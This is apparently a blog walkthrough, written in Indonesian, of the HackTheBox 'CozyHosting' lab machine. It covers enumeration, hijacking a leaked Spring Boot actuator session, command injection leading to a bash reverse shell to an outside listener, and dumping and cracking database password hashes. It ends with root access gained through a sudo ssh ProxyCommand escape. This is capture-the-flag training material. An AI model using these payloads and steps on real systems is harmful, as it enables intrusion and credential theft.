---
title: "CozyHosting : HTB Writeup"
date: 2023-09-08
tags:
  - HTB
  - CTF
draft: false
summary: >-
  CozyHosting Easy Machine writeup from HackTheBox
---

## Enumeration

### Penggunaan NMAP

Seperti biasa kita mencari informasi tentang target seperti IP Address, Services dll menggunakan `NMAP`
```sh
┌[parrot]─[19:56-09/09]─[~]
└╼k1r4$nmap -sC -sV 10.129.78.19
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-09 19:56 WIB
Nmap scan report for 10.129.78.19
Host is up (0.10s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4356bca7f2ec46ddc10f83304c2caaa8 (ECDSA)
|_  256 6f7a6c3fa68de27595d47b71ac4f7e42 (ED25519)
80/tcp    open     http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
1216/tcp  filtered etebac5
25735/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.45 seconds
```

>Disini saya mendapatkan port 80 dengan services `HTTP` dan port 23 dengan service `SSH` terbuka

Setelah itu saya mengunjungi port `HTTP` yang terbuka, akan tetapi saya tidak menemukan fungsi yang menarik, hanya ada halaman login saja

![Screenshot at 2023-09-09 20-37-02](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/e07e9ac7-541b-46c8-aa28-66bc70be13ad)


### Penggunaan Dirsearch

Saya pikir dihalaman login saya akan menemukan celah SQL Injection, ternyata tidak 😿 oleh karena itu saya akan melakukan fuzzing directory web tersebut menggunakan `Dirsearch` untuk mendapatkan informasi directory apa saja yang dapat kita teliti

```sh
┌[parrot]─[20:55-09/09]─[~]
└╼k1r4$dirsearch -u http://cozyhosting.htb/ --exclude-sizes=0B

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/k1r4/Downloads/reports/http_cozyhosting.htb/__23-09-09_20-55-30.txt

Target: http://cozyhosting.htb/

[20:55:30] Starting:
[20:55:51] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[20:55:53] 400 -  435B  - /a%5c.aspx
[20:55:55] 200 -  634B  - /actuator
[20:55:56] 200 -    5KB - /actuator/env
[20:55:56] 200 -   10KB - /actuator/mappings
[20:55:56] 200 -   15B  - /actuator/health
[20:55:56] 200 -   95B  - /actuator/sessions
[20:55:57] 401 -   97B  - /admin
[20:55:58] 200 -  124KB - /actuator/beans
[20:56:41] 500 -   73B  - /error
[20:57:03] 200 -    4KB - /login

Task Completed

```
### Spring Boot Actuator

Disini saya menemukan Directory yang cukup unik yaitu `/actuator`
>Saya menacari informasi digoogle tentang apa itu actuator, dan menemukan bahwa actuator adalah bagian dari springboot framework java "Spring Boot Actuator adalah sub-proyek dari Spring Boot Framework. Ini mencakup sejumlah fitur tambahan yang membantu kami memantau dan mengelola aplikasi Spring Boot. Ini berisi titik akhir actuator (tempat di mana sumber daya berada). Kita dapat menggunakan endpoint HTTP dan JMX untuk mengelola dan memantau aplikasi Spring Boot. Jika kita ingin mendapatkan fitur siap produksi dalam suatu aplikasi, kita harus actuator aktuator Spring Boot"

Dan saya mencari tau lebih lanjut apakah ada exploit untuk actuator ini, lalu mendapatkan referensi tentang kerentanan actuator di [hacktricks.xy](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)

Disitu dijelaskan bahwa ada beberapa endpoint yang menimbulkan adanya `kerentanan`
- /dump - displays a dump of threads (including a stack trace)
- /trace - displays the last several HTTP messages (which could include session identifiers)
- /logfile - outputs the contents of the log file
- /shutdown - shuts the application down
- /mappings - shows all of the MVC controller mappings
- /env - provides access to the configuration environment
- /restart - restarts the application
- /heapdump - Builds and returns a heap dump from the JVM used by our application
> Ada beberapa endpoint yang tidak ada dari hasil output `dirsearch`

Kemudian saya teliti semua endpoint yang  di dapat dari hasil `dirsearch` , pada endpoint `/actuator/env` terdapat credential yang terekspos, akan tetapi credentials tersebut tidak terbaca

```sh
┌[parrot]─[21:13-09/09]─[~]
└╼k1r4$curl http://cozyhosting.htb/actuator/env | jq

{
  "activeProfiles": [],
  "propertySources": [
    {
      "name": "server.ports",
      "properties": {
        "local.server.port": {
          "value": "******"
        }
      }
    },
    {
      "name": "servletContextInitParams",
      "properties": {}
    },
    {
      "name": "systemProperties",
      "properties": {
        "java.specification.version": {
          "value": "******"
     .........
```
Selain itu saya menemukan endpoint yang cukup unik `/actuator/sessions`, saya menemukan sessions yang sedang login pada endpoint tersebut

```sh
┌[parrot]─[21:19-09/09]─[~]
└╼k1r4$curl http://cozyhosting.htb/actuator/sessions | jq

{
  "364AB622979A017B18A35E1421E82350": "kanderson",
  "A0DD82349EABA00EE08B83ABA269CC06": "UNAUTHORIZED"
}
```

## Exploit
### Memanfaatkan Leaked Sessions

Saya mencoba memanfaatkan sessions tersebut dengan melakukan manipulasi sesi menggnakan `inspect element`
![Screenshot at 2023-09-09 21-36-57](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/b530d0ec-e4ed-460a-88ae-4fb9a1e11d98)
> kalian bisa login ke dashboard admin menggunakan credential apapun, karena celah login pada web ini hanya pada cookie sessions leaked

Disini saya hanya menemukan form untuk koneksi ssh
![Screenshot at 2023-09-09 21-32-47](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/f0f08f86-1fff-444e-9aec-336b02ef1761)

### Comand Injection to RCE
Pada awalnya saya menemukan kejanggalan saat meneliti form tersebut, saya menemukan adanya celah `comand injection` pada parameter username
![Screenshot at 2023-09-09 21-51-40](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/d65a0897-e4bb-404c-a27f-cbcf5076101d)

Karena saya berhasil melakukan `Comand Injection` lalu tahap berikutnya saya akan melakukan `Reverse Shell` untuk masuk ke web server tersebut
![Screenshot at 2023-09-10 03-29-13](https://github.com/k1r4-id/k1r4-id.github.io/assets/62828015/8517d5d0-ffd7-4e56-9753-a34982c9a64a)

```sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.10.14.30/4444 0>&1'
```
> ini adalah script revershell yang saya gunakan

Saya mendapatkan akses shell sebagai pengguna `app`

```sh
┌[parrot]─[22:15-09/09]─[~]
└╼k1r4$pwncat-cs -lp 4444

[22:15:21] Welcome to pwncat 🐈!                                                                         __main__.py:164
[22:15:42] received connection from 10.129.78.19:40540                                                        bind.py:84
[22:15:46] 10.129.78.19:40540: registered new host w/ db                                                  manager.py:957
(local) pwncat$
(remote) app@cozyhosting:/app$
```
Saya menemukan file `jar` difolder `app`, lalu saya copy file tersebut ke dir `tmp`  dan extract. Saya menemukan credential database `postgresql` didalam file `application.properties` pada directory `/BOOT-INF/classes`

```sh
(remote) app@cozyhosting:/app$ ls
cloudhosting-0.0.1.jar
(remote) app@cozyhosting:/app$ cp cloudhosting-0.0.1.jar /tmp/
(remote) app@cozyhosting:/app$ cd /tmp/
(remote) app@cozyhosting:/tmp$ ls
BOOT-INF
cloudhosting-0.0.1.jar
hsperfdata_app
META-INF
org
systemd-private-4c3ec572ed18415091ba4338c21d71c1-ModemManager.service-Yq4WNZ
systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-logind.service-Q8MYmy
systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-resolved.service-Z4nt4m
systemd-private-4c3ec572ed18415091ba4338c21d71c1-systemd-timesyncd.service-XhL0kU
systemd-private-4c3ec572ed18415091ba4338c21d71c1-upower.service-SY3DWm
tomcat.8080.3718851477085433742
tomcat-docbase.8080.6252866923267777882
vmware-root_765-4248156194
(remote) app@cozyhosting:/tmp$ cd BOOT-INF/
(remote) app@cozyhosting:/tmp/BOOT-INF$ ls
classes  classpath.idx	layers.idx  lib
(remote) app@cozyhosting:/tmp/BOOT-INF$ cd classes/
(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ ls
application.properties	htb  static  templates
(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ cat application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```
Saya berhasil connect ke services `postgresql` menggunakan credential tersebut, dan saya melihat ada databases apa saja di dalamnya

```sh
(remote) app@cozyhosting:/tmp/BOOT-INF/classes$ psql -h localhost -U postgres
Password for user postgres:
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

postgres=#
```
Saya connect ke dalam databases cozyhosting dan menemukan hash user admin dan kanderson

```sh
postgres=# \c cozyhosting
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "cozyhosting" as user "postgres".

cozyhosting=# \d
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

cozyhosting=# select * from users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)

cozyhosting=#
```
Lalu saya mencoba memecahkan hash tersebut menggunakan `john ripper` dan berhasil memecahkannya

```sh
┌[parrot]─[03:56-10/09]─[/home/k1r4/Documents/exercise/HTB/Easy/CozyHosting]
└╼k1r4$john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
```
Dikarenakan saya tidak menemukan user `admin` dan `kanderson`, saya mencoba login menggunakan user `josh`

```sh
(remote) app@cozyhosting:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
```
Saya berhasil connect kedalam user `josh` dan mendapatkan flag user.txt
```sh
(remote) app@cozyhosting:/$ su josh
Password:
josh@cozyhosting:~$ ls
user.txt
josh@cozyhosting:~$ cat user.txt
3cbc3707136b3032418291fc37534790
```
## PRIVILAGE ESCALATION

Setelah melakukan berbagai cara, saya mendapatkan vuln untuk mendapatkan akses shell user `root`
```sh
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```
Saya mencari referensi tentang kerentanan ssh, dan saya mendapatkan exploit tersebut di web [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/#sudo)
dan saya berhasil mendapatkan akses shell root menggunakan payload yang ada pada web tersebut, payloadnya cukup sederhana 😸

```sh
josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
c9786844cc014fd8d4e776e5645f5e54
```
Sekian dari saya. Terimakasih 😸
